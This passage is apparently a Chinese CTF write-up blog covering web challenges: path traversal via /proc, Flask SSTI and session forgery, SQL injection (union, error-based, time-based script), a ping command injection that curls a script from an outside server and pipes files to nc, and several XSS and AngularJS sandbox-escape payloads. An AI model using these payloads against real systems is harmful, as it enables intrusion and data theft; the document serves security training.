当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示</p><pre><code>/proc/sched_debug # 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用/proc/mounts # 挂载的文件系统列表/proc/net/arp # arp表，可以获得内网其他机器的地址/proc/net/route # 路由表信息/proc/net/tcp and /proc/net/udp # 活动连接的信息/proc/net/fib_trie # 路由缓存/proc/version  # 内核版本/proc/[PID]/cmdline # 可能包含有用的路径信息/proc/[PID]/environ #  程序运行的环境变量信息，可以用来包含getshell/proc/[PID]/cwd     # 当前进程的工作目录/proc/[PID]/fd/[#] # 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</code></pre><p>3.flasksession伪造</p><h3 id="思路：-4"><a href="#思路：-4" class="headerlink" title="思路："></a>思路：</h3><p>利用目录穿越实现读取/proc/self/cmdline，读取flag.py，读取key.py</p><p>利用脚本配合key伪造session</p><h3 id="解题：-5"><a href="#解题：-5" class="headerlink" title="解题："></a>解题：</h3><p>1.</p><pre><code>?name=../../../../proc/self/cmdline</code></pre><p>得pythonserver.py</p><p>2.</p><pre><code>?name=../../../../proc/self/cwd/server.py</code></pre><p>得</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> os<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token punctuation">(</span>Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template_string<span class="token punctuation">)</span><span class="token keyword">from</span> flask_session <span class="token keyword">import</span> Sessionapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>execfile<span class="token punctuation">(</span><span class="token string">'flag.py'</span><span class="token punctuation">)</span>execfile<span class="token punctuation">(</span><span class="token string">'key.py'</span><span class="token punctuation">)</span>FLAG <span class="token operator">=</span> flagapp<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> key @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/n1page"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">n1page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">!=</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    n1code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"n1code"</span><span class="token punctuation">)</span> <span class="token operator">or</span> None    <span class="token keyword">if</span> n1code <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>         n1code <span class="token operator">=</span> n1code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"n1code"</span> <span class="token operator">not</span> <span class="token keyword">in</span> session <span class="token operator">or</span> session<span class="token punctuation">[</span><span class="token string">'n1code'</span><span class="token punctuation">]</span> <span class="token keyword">is</span> None<span class="token punctuation">:</span> session<span class="token punctuation">[</span><span class="token string">'n1code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> n1code    template <span class="token operator">=</span> None    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'n1code'</span><span class="token punctuation">]</span> <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>         template <span class="token operator">=</span>         <span class="token triple-quoted-string string">'''        &lt;h1>N1 Page&lt;/h1> &lt;div class="row> &lt;div class="col-md-6 col-md-offset-3 center"> Hello : %s, why you don't look at our &lt;a href='/article?name=article'>article&lt;/a>? &lt;/div> &lt;/div>         '''</span> <span class="token operator">%</span>        session<span class="token punctuation">[</span><span class="token string">'n1code'</span><span class="token punctuation">]</span>        session<span class="token punctuation">[</span><span class="token string">'n1code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> None        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span> @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"main.html"</span><span class="token punctuation">)</span> @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/article'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">article</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     error <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> <span class="token string">'name'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>    page <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> <span class="token string">'article'</span><span class="token keyword">if</span> page<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span> page <span class="token operator">=</span> <span class="token string">'notallowed.txt'</span><span class="token keyword">try</span><span class="token punctuation">:</span>    template <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'/home/nu11111111l/articles/{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    template <span class="token operator">=</span> e    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'article.html'</span><span class="token punctuation">,</span> template<span class="token operator">=</span>template<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a></p><p>目前的session经过解密是：{‘n1code’: None}</p><p>针对源代码进行注入：</p><pre><code>{&#39;n1code&#39;: &#39;{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}&#39;}</code></pre><p>这个地方为什么注入这样的语句我没弄明白</p><p>3.利用脚本配合key.py构造session</p><p>获取key.py</p><pre><code>?name=../../../../proc/self/cwd/key.py</code></pre><p>key = ‘Drmhze6EPcv0fN_81Bj-nA’</p><pre><code> python hctf_admin_2.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;{&#39;n1code&#39;: &#39;{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}&#39;}&quot;得到：.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.YIwlRQ.1bHGytWxAX498Sfx6r9JQtrwrSU</code></pre><p>将其保存到cookie中的session中即可，注意前面的点</p><h2 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入-1"></a>SQL注入-1</h2><pre><code>&amp;tips=1</code></pre><p>得到提示：select * from notes where id =’3’</p><p>payload：</p><pre><code>1&#39; order by 4 --+1&#39; order by 3 --+-1&#39; union select 1,2,3 --+-1&#39; union select 1,database(),3 --+-1&#39; union select 1,concat(table_name),3 from information_schema.tables where table_schema=&#39;note&#39; --+-1&#39; union select 1,concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39; --+-1&#39; union select 1,concat(fllllag),3 from note.fl4g --+</code></pre><p>得到flag：<strong>n1book{union_select_is_so_cool}</strong></p><h2 id="SQL注入-2"><a href="#SQL注入-2" class="headerlink" title="SQL注入-2"></a>SQL注入-2</h2><h3 id="考点：-6"><a href="#考点：-6" class="headerlink" title="考点："></a>考点：</h3><p>报错注入</p><h3 id="解题：-6"><a href="#解题：-6" class="headerlink" title="解题："></a>解题：</h3><h4 id="基于报错："><a href="#基于报错：" class="headerlink" title="基于报错："></a>基于报错：</h4><pre><code>name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+&amp;pass=xxxxname=1&#39;and updatexml(1,concat(0x7e,(seLEct group_concat(table_name) from information_schema.tables where table_schema=&#39;note&#39;),0x7e),1)--+&amp;pass=xxxxname=1&#39;and updatexml(1,concat(0x7e,(seLEct group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;),0x7e),1)--+&amp;pass=xxxxname=1&#39;and updatexml(1,concat(0x7e,(seLEct group_concat(flag) from note.fl4g),0x7e),1)--+&amp;pass=xxxx</code></pre><p>得：n1book{login_sqli_is_nice}</p><h4 id="基于时间："><a href="#基于时间：" class="headerlink" title="基于时间："></a>基于时间：</h4><p>大体骨架：</p><pre><code>name=1&#39;+or+if(substr(database(),1,1)=&#39;n&#39;,sleep(1),1)#&amp;pass=xxx</code></pre><p>脚本：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timel <span class="token operator">=</span> <span class="token string">'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890{}'</span>url <span class="token operator">=</span> <span class="token string">'http://challenge-92892f03ae72aafc.sandbox.ctfhub.com:10080/login.php'</span><span class="token comment" spellcheck="true"># sql = "1' or if(substr(database(),%d,1)='%s',sleep(2),1)#"</span><span class="token comment" spellcheck="true"># sql = "1' or if(substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s',sleep(2),1)#"</span><span class="token comment" spellcheck="true"># sql = "1' or if(substr((seLEct group_concat(column_name) from information_schema.columns where table_name='fl4g'),%d,1)='%s',sleep(2),1)#"</span>sql <span class="token operator">=</span> "<span class="token number">1</span><span class="token string">' or if(substr((seLEct flag from fl4g),%d,1)='</span><span class="token operator">%</span>s'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#"</span>flag <span class="token operator">=</span> <span class="token string">''</span>length<span class="token operator">=</span><span class="token number">4</span><span class="token keyword">for</span> num <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'name'</span> <span class="token punctuation">:</span> sql <span class="token operator">%</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'pass'</span> <span class="token punctuation">:</span> <span class="token string">'asdasd'</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># print(data)</span>        t <span class="token operator">=</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url <span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> t <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">:</span>            flag <span class="token operator">+=</span> i            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag:"</span> <span class="token punctuation">,</span> flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="死亡ping命令"><a href="#死亡ping命令" class="headerlink" title="死亡ping命令"></a>死亡ping命令</h2><h3 id="考点：-7"><a href="#考点：-7" class="headerlink" title="考点："></a>考点：</h3><p><a href="https://zhuanlan.zhihu.com/p/138393396" target="_blank" rel="noopener">反弹shell原理与实现</a></p><p><a href="https://blog.csdn.net/xysoul/article/details/52270149" target="_blank" rel="noopener">nc工具的使用</a></p><h3 id="思路：-5"><a href="#思路：-5" class="headerlink" title="思路："></a>思路：</h3><p>利用curl命令来写入木马</p><p>利用已有的服务器，先编写脚本，然后再客户端将木马导入，再用该服务器对响应的端口进行监听，来获取返回值</p><h3 id="解题：-7"><a href="#解题：-7" class="headerlink" title="解题："></a>解题：</h3><p>在外部服务器编写脚本1.sh：</p><pre><code>ls / | nc [服务器ip地址] 8089cat /FLAG | nc [服务器ip地址] 8089</code></pre><p>payload：</p><pre><code>127.0.0.1%0acurl [服务器ip地址]/1.sh &gt; /tmp/1.sh127.0.0.1%0achmod 777 -R /tmp/1.sh</code></pre><p>然后在服务器端执行：</p><pre><code>nc -lvp 8089</code></pre><p>客户端触发脚本：</p><pre><code>127.0.0.1%0ash /tmp/1.sh </code></pre><p>这时候就会反弹得到flag</p><h2 id="XSS闯关"><a href="#XSS闯关" class="headerlink" title="XSS闯关"></a>XSS闯关</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>level1?username=xss</p><p>构造payload：</p><pre><code>level1?username=&lt;img src=1 onerror=alert(1)&gt;</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>插不进去的原因：</p><pre class="line-numbers language-php+html"><code class="language-php+html">        if(location.search == ""){            location.search = "?username=xss"        }        var username = '';        document.getElementById('ccc').innerHTML= "Welcome " + escape(username);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入的参数被escape函数编码了</p><h4 id="扫盲：-2"><a href="#扫盲：-2" class="headerlink" title="扫盲："></a>扫盲：</h4><p>JavaScript escape() 函数</p><p><a href="https://www.runoob.com/jsref/jsref-obj-global.html" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://www.runoob.com/images/up.gif" alt="函数参考手册"> JavaScript 全局函数</a></p><hr><p>定义和用法</p><p>escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</p><p>该方法不会对 ASCII 字母和数字进行编码，也不会对下面这些 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被转义序列替换。</p><p><strong>提示：</strong> 使用 <a href="https://www.runoob.com/jsref/jsref-unescape.html" target="_blank" rel="noopener">unescape()</a> 方法对字符串进行解码。</p><h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass:"></a>bypass:</h4><pre><code>level2?username&#39;;alert(1);//</code></pre><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>bypass:</p><pre><code>&lt;img src=1 onerror=alert(1)&gt;</code></pre><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>本地特色：</p><pre class="line-numbers language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> time <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> jumpUrl<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            jumpUrl <span class="token operator">=</span> location<span class="token punctuation">.</span>href<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            jumpUrl <span class="token operator">=</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">jump</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>time <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                location<span class="token punctuation">.</span>href <span class="token operator">=</span> jumpUrl<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                time <span class="token operator">=</span> time <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token template-string"><span class="token string">`页面</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>time<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">秒后将会重定向到</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">escape</span><span class="token punctuation">(</span>jumpUrl<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>                <span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span>variable<span class="token punctuation">)</span>        <span class="token punctuation">{</span>               <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                       <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>               <span class="token punctuation">}</span>               <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用location.herf=jumpurl来实现一个重定向</p><p>构造payload：</p><pre><code>?jumpUrl=javascript:alert(1);</code></pre><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><pre class="line-numbers language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'autosubmit'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> autoForm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'autoForm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            autoForm<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">?</span> location<span class="token punctuation">.</span>href <span class="token punctuation">:</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            autoForm<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span>variable<span class="token punctuation">)</span>        <span class="token punctuation">{</span>               <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                       <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>               <span class="token punctuation">}</span>               <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保证autosubmit和action有参数，然后autoForm的参数将会被执行</p><p>bypass：</p><pre><code>?autosubmit=1&amp;action=javascript:alert(1);</code></pre><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>javascript框架：angularjs1.4.6</p><p>首先参考下面这个网页：<br>AngularJS客户端模板注入（XSS）<br>看完后就是模板注入XSS有了了解，不过由于我们的Angular版本是1.4.6，存在沙箱，因此要去搜索这个版本的Angular的沙箱逃逸的方法：<br>AngularJS Sandbox Bypasses<br>从中得知的逃逸的办法：</p><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></pre><p>后面的alert(1)那里可以换成任意js函数。不过这题我们不需要，直接构造就可以了：</p><pre><code>?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></pre><h2 id="2020-网鼎杯-青龙组-Web-AreUSerialz"><a href="#2020-网鼎杯-青龙组-Web-AreUSerialz" class="headerlink" title="2020-网鼎杯-青龙组-Web-AreUSerialz"></a>2020-网鼎杯-青龙组-Web-AreUSerialz</h2><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token 